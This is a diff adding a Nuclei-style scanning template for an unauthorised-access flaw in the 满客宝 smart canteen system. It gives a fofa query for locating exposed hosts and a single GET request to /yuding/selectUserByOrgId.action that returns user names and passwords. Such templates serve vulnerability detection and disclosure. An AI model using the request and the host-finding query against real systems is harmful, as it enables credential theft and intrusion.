@@ -1,0 +1,38 @@
+id: mankebao-selectUserByOrgId-unauthorized
+
+info:
+  name: 满客宝智慧食堂系统 selectUserByOrgId 未授权访问
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: icon_hash="-409875651"
+    由于满客宝智慧食堂系统 selectUserByOrgId 接口处未进行权限控制，导致未经身份验证的远程攻击者可以未授权访问，泄露系统用户账号密码等信息，进一步破解即可登录系统后台，使系统处于极不安全的状态。
+  reference:
+    - 
+  tags: unauthorized
+
+
+http:
+  - raw:
+      - |
+        GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'password'
+          - 'userName'
+          - '"success":true'
+          - '"result":['
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
